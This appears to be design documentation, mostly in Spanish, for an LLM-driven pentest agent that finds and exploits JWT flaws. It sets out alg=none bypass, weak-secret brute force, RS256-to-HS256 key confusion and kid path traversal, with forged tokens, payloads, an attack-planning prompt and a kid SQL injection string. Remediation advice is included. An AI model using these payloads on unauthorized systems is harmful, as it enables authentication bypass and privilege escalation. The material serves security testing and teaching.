# JWTAgent - El Especialista en JSON Web Token Security

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-347 (Improper Verification of Cryptographic Signature)  
> **Clase**: `bugtrace.agents.jwt_agent.JWTAgent`  
> **Archivo**: `bugtrace/agents/jwt_agent.py`

---

## Overview

**JWTAgent** es el especialista de autenticación y autorización de BugTraceAI, diseñado específicamente para detectar y explotar vulnerabilidades críticas en la implementación de **JSON Web Tokens (JWT)**.

Este agente no es solo un validador pasivo de JWTs - es un **Authentication & Authorization Specialist** completo que combina técnicas de criptoanálisis, ataques de confusión algorítmica, y explotación de business logic para comprometer sistemas de autenticación basados en tokens.

### 🎯 **Capacidades Principales**

| Capability | Descripción | Impacto |
|------------|-------------|---------|
| **Token Discovery** | Búsqueda automatizada de JWTs en múltiples ubicaciones (headers, cookies, localStorage, URL params, DOM) | Cobertura total del vector de ataque |
| **None Algorithm Bypass** | Explotación de tokens con `alg=none` para eliminar completamente la firma | **CRITICAL** - Bypass total de autenticación |
| **Key Confusion Attack** | Ataque de confusión RS256→HS256 usando la clave pública como secreto HMAC | **CRITICAL** - Forjado de tokens con privilegios elevados |
| **Weak Secret Brute Force** | Dictionary attack offline sobre secretos HMAC débiles (HS256) | **CRITICAL** - Revelación del secreto y forjado de tokens |
| **KID Injection** | Path traversal via parámetro `kid` para usar `/dev/null` como clave de firma | **HIGH** - Bypass de verificación de firma |
| **LLM-Driven Strategy** | Análisis inteligente del contexto del token para generar planes de ataque personalizados | Adaptabilidad a implementaciones custom |
| **Queue Consumer Mode** | Procesamiento paralelo de múltiples tokens mediante worker pool (Phase 20) | Escalabilidad en pentests masivos |

---

## Arquitectura del Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│               JWT AGENT EXPLOITATION WORKFLOW                    │
└─────────────────────────────────────────────────────────────────┘

Input: URL objetivo
│
▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 1: TOKEN DISCOVERY (Multi-Location Scanning)              │
├────────────────────────────────────────────────────────────────┤
│  🔍 Browser-Based Discovery                                    │
│  • Authorization Headers (Bearer tokens)                       │
│  • Cookies (session=eyJ...)                                    │
│  • localStorage / sessionStorage                               │
│  • URL Parameters (?token=eyJ...)                              │
│  • Page Links (<a href="?jwt=eyJ...">)                         │
│  • Body Text / HTML (regex: eyJ[a-zA-Z0-9_-]{10,}\.eyJ...)     │
│                                                                 │
│  🧠 Smart Fallback:                                            │
│  • Si no encuentra tokens en el endpoint objetivo, prueba      │
│    la landing page (root "/" del dominio)                      │
│                                                                 │
│  Output: List[(token, location)]                               │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 2: TOKEN ANALYSIS & STRATEGY GENERATION                   │
├────────────────────────────────────────────────────────────────┤
│  🔓 Decode Token (Without Verification)                        │
│  • Extrae Header: {"alg": "HS256", "typ": "JWT", "kid": ".."}  │
│  • Extrae Payload: {"sub": "user123", "role": "guest", ...}    │
│  • Identifica el algoritmo en uso (HS256, RS256, None, etc.)   │
│                                                                 │
│  🧠 LLM Smart Analysis (Optional):                             │
│  • Prompt: "TARGET: {url}, JWT_HEADER: {...}, JWT_PAYLOAD: {...}" │
│  • LLM genera un plan de ataque contextual basado en:          │
│    - Claims presentes (admin, role, permissions)               │
│    - Algoritmo detectado                                       │
│    - Presencia de kid, jku, x5u (inyección potencial)          │
│                                                                 │
│  Fallback Plan (Si LLM falla):                                 │
│  • ["Check None Algorithm", "Brute Force Secret",              │
│     "Check KID Injection", "Algorithm Confusion"]              │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 3: ATTACK EXECUTION (Multi-Vector Exploitation)           │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│  A) ⚠️ None Algorithm Bypass                                   │
│     1. Modifica header: alg = "none" (y variantes: None, NONE) │
│     2. Eleva privilegios en payload: {"admin": true, "role": "admin"} │
│     3. Remueve firma: eyJ0eXA...eyJzdWI...  (trailing dot)     │
│     4. Verifica aceptación: Baseline (invalid) vs Forged       │
│     → Si 401/403 → 200 = CRITICAL BYPASS                       │
│                                                                 │
│  B) 🔑 Weak Secret Brute Force (HS256 Only)                    │
│     1. Wordlist: ["secret", "password", "123456", "jwt", ...]  │
│     2. Para cada secret: HMAC-SHA256(header.payload, secret)   │
│     3. Compara con signature original                          │
│     4. Si match → Forja admin token con el secreto crackeado   │
│     → SECRET REVEALED = GAME OVER                              │
│                                                                 │
│  C) 🔀 Key Confusion (RS256 → HS256)                           │
│     1. Descarga clave pública de /.well-known/jwks.json        │
│     2. Modifica header: alg = "HS256"                          │
│     3. Firma con la PUBLIC KEY como HMAC secret                │
│     4. Prueba múltiples formatos (PKCS1, SubjectPublicKeyInfo) │
│     → Si server valida = CRITICAL CONFUSION                    │
│                                                                 │
│  D) 📂 KID Injection (Path Traversal)                          │
│     1. Modifica kid: "../../../../../../../dev/null"           │
│     2. Firma con clave vacía (contenido de /dev/null)          │
│     3. HMAC-SHA256(header.payload, "")                         │
│     → Si aceptado = HIGH INJECTION                             │
│                                                                 │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 4: VERIFICATION & IMPACT ASSESSMENT                       │
├────────────────────────────────────────────────────────────────┤
│  ✅ Smart Validation Logic                                     │
│                                                                 │
│  1. Baseline Request (Control):                                │
│     • Envía token INVÁLIDO (invalid.token.123)                 │
│     • Observa respuesta: status_code, body_content             │
│                                                                 │
│  2. Exploit Request (Test):                                    │
│     • Envía token FORJADO con payload elevado                  │
│     • Observa respuesta: status_code, body_content             │
│                                                                 │
│  3. Diff Analysis:                                             │
│     ✓ Status Code Change: 401/403 → 200                        │
│     ✓ Success Keywords Appeared: "welcome", "admin", "flag"    │
│     ✓ Fail Keywords Disappeared: "invalid", "unauthorized"     │
│                                                                 │
│  Output: Finding con status VALIDATED_CONFIRMED                │
└────────────────────────────────────────────────────────────────┘
```

---

## Attack Vectors en Detalle

### 1️⃣ None Algorithm Bypass

**Objetivo**: Eliminar completamente la verificación de firma estableciendo `alg=none`.

**Variantes Probadas**:
```json
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}  // Bypass de validación case-sensitive
```

**Formatos de Token**:
- **Con trailing dot**: `eyJ0eXA...eyJzdWI....`  (estándar)
- **Sin trailing dot**: `eyJ0eXA...eyJzdWI...` (bypass de parsers estrictos)

**Payload Escalated**:
```json
{
  "sub": "attacker@evil.com",
  "admin": true,          // ← Privilegio inyectado
  "role": "admin",        // ← Rol elevado
  "exp": 9999999999
}
```

**Ejemplo de Explotación**:
```bash
# Original Token (válido)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6Imd1ZXN0In0.xyz123

# Forged Token (alg=none, admin=true, signature removed)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.
```

**Detección de Éxito**:
- Respuesta cambia de `401 Unauthorized` → `200 OK`
- Aparecen keywords: `"admin"`, `"welcome"`, `"flag"`

---

### 2️⃣ Weak Secret Brute Force (HS256)

**Objetivo**: Crackear el secreto HMAC mediante dictionary attack offline.

**Wordlist Integrada**:
```python
["secret", "password", "123456", "jwt", "key", "auth", "admin", 
 "token", "1234567890", "mysupersecret"]
```

**Algoritmo**:
```python
# Para cada candidato en wordlist
for secret in wordlist:
    computed_sig = HMAC-SHA256(header.payload, secret)
    if computed_sig == original_signature:
        print(f"🔥 SECRET FOUND: {secret}")
        forge_admin_token_with_secret(secret)
```

**Output de Ataque**:
```
🔥 CRITICAL: Found weak JWT secret: 'secret'

Forged Admin Token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwicm9sZSI6ImFkbWluIn0.abc123def456
```

**Impacto**: 
- El atacante puede forjar **cualquier token** con **cualquier claim**.
- Bypass total de autenticación + escalación de privilegios.

---

### 3️⃣ Key Confusion Attack (RS256 → HS256)

**Objetivo**: Explotar servidores que no validan el algoritmo correctamente, permitiendo cambiar de firma asimétrica (RS256) a simétrica (HS256) y usar la clave pública del servidor como secreto HMAC.

**Pasos del Ataque**:

1. **Descarga de Clave Pública**:
   ```bash
   curl https://target.com/.well-known/jwks.json
   ```

2. **Conversión de Algoritmo**:
   ```json
   # Original Header
   {"alg": "RS256", "typ": "JWT"}
   
   # Modified Header
   {"alg": "HS256", "typ": "JWT"}
   ```

3. **Firma con Clave Pública**:
   ```python
   # La clave pública (normalmente usada para VERIFICAR) se usa para FIRMAR
   public_key_pem = fetch_from_jwks()
   forged_sig = HMAC-SHA256(header.payload, public_key_pem)
   ```

4. **Prueba de Formatos**:
   - `SubjectPublicKeyInfo` (estándar)
   - `PKCS1` (legacy)

**Por qué Funciona**:
- Servidores mal configurados que **aceptan cualquier algoritmo** sin validar consistencia.
- El código vulnerable hace esto:
  ```python
  # ❌ VULNERABLE
  jwt.decode(token, key=get_key(), algorithms=["RS256", "HS256"])
  
  # ✅ SECURE
  jwt.decode(token, key=get_key(), algorithms=["RS256"])
  ```

---

### 4️⃣ KID Injection (Directory Traversal)

**Objetivo**: Manipular el parámetro `kid` (Key ID) en el header para apuntar a un archivo del sistema conocido (como `/dev/null`) y forzar al servidor a usar su contenido como clave de firma.

**Payload Inyectado**:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"  // Path traversal
}
```

**Firma con Clave Vacía**:
```python
# /dev/null tiene contenido vacío
secret = ""  # Contenido de /dev/null
signature = HMAC-SHA256(header.payload, secret)
```

**Impacto**: 
- Si el servidor lee `kid` sin sanitización y usa el contenido del file path como clave, el ataque tiene éxito.
- Permite forjar tokens válidos sin conocer la clave real.

---

## Token Discovery - Cobertura Total

El JWTAgent no espera a que le pasen tokens - los **caza activamente** en múltiples ubicaciones:

### Ubicaciones Escaneadas:

| Ubicación | Método de Detección | Ejemplo |
|-----------|---------------------|---------|
| **Authorization Header** | Intercepta requests via Playwright | `Authorization: Bearer eyJ0eXA...` |
| **Cookies** | `page.context.cookies()` | `session=eyJ0eXA...` |
| **localStorage** | `page.evaluate("() => localStorage")` | `localStorage.token = "eyJ0eXA..."` |
| **URL Parameters** | `urlparse(url).query` | `?token=eyJ0eXA...` |
| **Links en DOM** | `querySelectorAll('a[href]')` | `<a href="?jwt=eyJ...">` |
| **Body Text / HTML** | Regex: `eyJ[a-zA-Z0-9_-]{10,}\.eyJ...` | `<script>const tok = "eyJ..."</script>` |

### Heurística Inteligente:

1. **Detección de JWT**:
   ```python
   def _is_jwt(token: str) -> bool:
       parts = token.split('.')
       return len(parts) == 3 and all(len(p) > 4 for p in parts[:2])
   ```

2. **Fallback a Landing Page**:
   - Si el endpoint objetivo (`/api/secret`) no revela tokens, el agente prueba automáticamente la landing page (`/`) donde suelen estar en el DOM.

3. **Deduplicación**:
   - Tokens idénticos encontrados en múltiples ubicaciones se procesan solo una vez.

---

## LLM-Driven Strategy

**Cuando los payloads estáticos no son suficientes**, el JWTAgent delega al LLM para generar una estrategia personalizada.

**Prompt Template**:
```
TARGET: https://api.target.com/admin
LOCATION: header
JWT_HEADER: {"alg": "HS256", "typ": "JWT", "kid": "key-2024"}
JWT_PAYLOAD: {"sub": "user@test.com", "role": "member", "exp": 1735689600}

Analyze this token. Is there a clear path to privilege escalation or authentication bypass?
Generate a plan using known JWT attack vectors.
```

**Output Esperado (XML)**:
```xml
<thought>
El token usa HS256 con kid personalizado. Hay un claim "role" que podemos escalar.
Vías de ataque:
1. None algorithm bypass (si el server acepta alg=none)
2. Brute force del secret (HS256 es vulnerable)
3. KID injection (kid no sanitizado podría permitir path traversal)
</thought>

<plan>
1. Check None Algorithm with role=admin
2. Brute Force HS256 Secret
3. KID Injection with /dev/null
</plan>

<payload>eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.</payload>

<target_location>header</target_location>
```

**Ventajas**:
- Adaptación a implementaciones custom (e.g., claims no estándar como `permissions`, `scope`)
- Identificación de ataques específicos al contexto (e.g., si hay `jku` URL, puede sugerir SSRF)

---

## Queue Consumer Mode (Phase 20)

El JWTAgent puede operar en **modo productor-consumidor** para procesar grandes volúmenes de tokens en paralelo.

### Arquitectura:

```
┌─────────────────────────────────────────────────────────────┐
│                    JWT QUEUE WORKFLOW                        │
└─────────────────────────────────────────────────────────────┘

                        ┌──────────────┐
                        │  Event Bus   │
                        │ WORK_QUEUED  │
                        │   _JWT       │
                        └───────┬──────┘
                                │
                                │ emit(WORK_QUEUED_JWT, {finding})
                                ▼
                    ┌──────────────────────┐
                    │   Queue Manager      │
                    │  jwt_queue.put()     │
                    └──────────┬───────────┘
                               │
                               │ pop items
                               ▼
       ┌───────────────────────────────────────────┐
       │        JWTAgent Worker Pool               │
       │  ┌─────────┐ ┌─────────┐ ┌─────────┐     │
       │  │ Worker1 │ │ Worker2 │ │ Worker3 │ ... │
       │  └────┬────┘ └────┬────┘ └────┬────┘     │
       └───────┼──────────┼──────────┼─────────────┘
               │          │          │
               └──────────┴──────────┘
                          │
                ┌─────────▼───────────┐
                │  _process_queue_item│
                │  → _analyze_and_exploit
                └─────────┬───────────┘
                          │
                          ▼
                ┌─────────────────────┐
                │ _handle_queue_result│
                │  emit(VULNERABILITY_DETECTED)
                └─────────────────────┘
```

### Configuración:

```python
# Iniciar en modo queue
await jwt_agent.start_queue_consumer(scan_context="scan_12345")

# El agente escucha eventos de tipo WORK_QUEUED_JWT
# y procesa items del jwt_queue con N workers
```

### Stats:

```python
stats = jwt_agent.get_queue_stats()
# {
#   "mode": "queue",
#   "queue_mode": true,
#   "worker_stats": {
#     "active_workers": 3,
#     "processed_items": 47,
#     "pending_items": 12
#   }
# }
```

---

## Validation Tiering - Clasificación de Hallazgos

El JWTAgent clasifica los hallazgos según el nivel de certeza:

### Tier 1: `VALIDATED_CONFIRMED` (Alta Confianza)

| Condición | Indicador |
|-----------|-----------|
| None algorithm bypass funciona | Token sin firma aceptado + privilegios elevados |
| Key confusion exitosa | Token forjado con clave pública aceptado |
| Weak secret crackeado | Secret revelado + admin token funcional |
| KID injection confirmada | Token con kid=`/dev/null` aceptado |

**Criterio**: El token forjado es **aceptado por el servidor** y otorga **acceso privilegiado**.

### Tier 2: `PENDING_VALIDATION` (Requiere Revisión)

| Condición | Indicador |
|-----------|-----------|
| Algorithm confusion detectado pero no explotado | Header modificable pero token rechazado |
| Signature no verificada (ambiguo) | Server acepta tokens con firma inválida pero sin escalación |

**Criterio**: Vulnerabilidad estructural detectada pero sin prueba de explotación.

---

## Configuración

```yaml
# En scan_config.yaml
specialists:
  jwt:
    enabled: true
    
    # Discovery
    auto_discover_tokens: true
    scan_landing_page_fallback: true
    
    # Attack Strategies
    check_none_algorithm: true
    brute_force_weak_secrets: true
    key_confusion_attack: true
    kid_injection_attack: true
    use_llm_analysis: true
    
    # Brute Force
    max_brute_attempts: 1000
    wordlist_path: null  # null = usa wordlist interna
    
    # Queue Mode (Phase 20)
    queue_mode: false  # true para modo productor-consumidor
    worker_pool_size: 3
    
    # Verification
    verification_timeout: 5  # segundos por request
    verification_max_retries: 2
```

---

## Reporting - Ejemplo de Finding

```json
{
  "type": "JWT None Algorithm",
  "url": "https://api.target.com/admin",
  "parameter": "alg",
  "payload": "alg:none",
  "severity": "CRITICAL",
  "cwe_id": "CWE-347",
  "cve_id": "N/A",
  "validated": true,
  "status": "VALIDATED_CONFIRMED",
  
  "description": "JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to 'none', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
  
  "reproduction": "# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to 'none'\n# 2. Remove signature (keep trailing dot)\n# Forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
  
  "http_request": "GET https://api.target.com/admin with forged token in Authorization header",
  "http_response": "200 OK with elevated privileges",
  
  "remediation": "1. Explicitly disallow 'none' algorithm in JWT verification.\n2. Use whitelist of allowed algorithms (e.g., only ['RS256']).\n3. Never accept unsigned tokens in production.\n4. Implement algorithm validation before signature verification."
}
```

---

## Performance Metrics

| Métrica | Valor Típico | Notas |
|---------|--------------|-------|
| **Token Discovery Time** | 3-8 segundos | Depende de la complejidad del DOM |
| **None Algorithm Attack** | < 100ms | 8 variantes (none, None, NONE, nOnE x 2 formatos) |
| **Brute Force (HS256)** | 50-200ms | Wordlist de 10 secretos comunes |
| **Key Confusion** | 1-3 segundos | Fetch de JWKS + 2 formatos x N keys |
| **KID Injection** | < 100ms | Single request test |
| **Total Exploitation Time** | 5-15 segundos | Para un token (todos los ataques) |

---

## Integration con Reactor V6

**Input**: JWTAgent recibe trabajo de:
- **Phase 3 (Discovery)**: Tokens descubiertos por otros agentes via `EventBus.emit("auth_token_found")`
- **Phase 4 (Exploitation)**: URLs objetivo donde buscar y explotar JWTs
- **Queue Manager**: Items en `jwt_queue` (modo productor-consumidor)

**Output**: JWTAgent emite:
- `EventBus.emit(VULNERABILITY_DETECTED)` → Findings confirmados van a **Phase 5 (Validation)**
- Reports con status `VALIDATED_CONFIRMED` → Directamente a **Phase 6 (Reporting)**

---

## Casos de Uso

### 1. Pentesting de API REST

```python
# Descubrir y explotar JWTs en API
result = await jwt_agent.check_url("https://api.target.com/user/profile")
# → Encuentra token en Authorization header
# → Craclea secret débil "secret"
# → Forja admin token
# → Result: {"vulnerable": true, "findings": [{"type": "Weak JWT Secret", ...}]}
```

### 2. Bug Bounty Automation

```python
# Modo queue para procesar múltiples targets
await jwt_agent.start_queue_consumer("scan_12345")

# Otro agente descubre tokens y los pone en queue
event_bus.emit("auth_token_found", {
    "token": "eyJ0eXA...",
    "url": "https://app.target.com",
    "location": "cookie"
})

# JWTAgent procesa automáticamente en paralelo
```

### 3. CI/CD Security Gate

```python
# Test de regresión en pre-production
from bugtrace.agents.jwt_agent import run_jwt_analysis

result = await run_jwt_analysis(
    token="eyJ0eXA...",
    url="https://staging-api.company.com"
)

if result["findings"]:
    raise SecurityError("JWT vulnerabilities detected!")
```

---

## Limitaciones Conocidas

| Limitación | Descripción | Workaround |
|------------|-------------|------------|
| **Wordlist Limitada** | Solo 10 secretos comunes en brute force | Usa `wordlist_path` para rockyou.txt |
| **Sin Soporte para EdDSA** | Solo HS256, RS256, None | Futuro: agregar EdDSA, ES256 |
| **KID Injection Básico** | Solo prueba `/dev/null` | Futuro: SQL injection en kid, jku SSRF |
| **Sin JKU/X5U Attacks** | No explota `jku` (URL de JWKS) ni `x5u` (cert URL) | Planeado para V2 |

---

## Roadmap (Future Enhancements)

- [ ] **JKU SSRF Attack**: Inyectar URL maliciosa en `jku` header para forzar SSRF
- [ ] **X5U Certificate Injection**: Explotar `x5u` para inyectar certificado atacante
- [ ] **KID SQL Injection**: Probar `kid` como vector de SQLi (`kid: "key' OR '1'='1"`)
- [ ] **JWT Confusion con múltiples keys**: Probar todas las keys en JWKS, no solo la primera
- [ ] **Timing Attack on HS256**: Detectar weak secrets mediante análisis de timing
- [ ] **Integration con jwt_tool**: Wrapper para aprovechar payloads de jwt_tool
- [ ] **Custom Claim Manipulation**: LLM-driven mutation de claims no estándar

---

## Referencias

- **RFC 7519**: JSON Web Token (JWT) - https://tools.ietf.org/html/rfc7519
- **PortSwigger JWT Attacks**: https://portswigger.net/web-security/jwt
- **jwt_tool (TibsecDev)**: https://github.com/ticarpi/jwt_tool
- **CWE-347**: Improper Verification of Cryptographic Signature
- **Auth0 JWT Handbook**: https://auth0.com/resources/ebooks/jwt-handbook
- **Skills System**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md) | Skill: `bugtrace/agents/skills/vulnerabilities/jwt.md`

---

*Última actualización: 2026-02-02*
*Agent Version: V4 Specialist Pattern*
*Compatible with: Reactor V6 Pipeline*
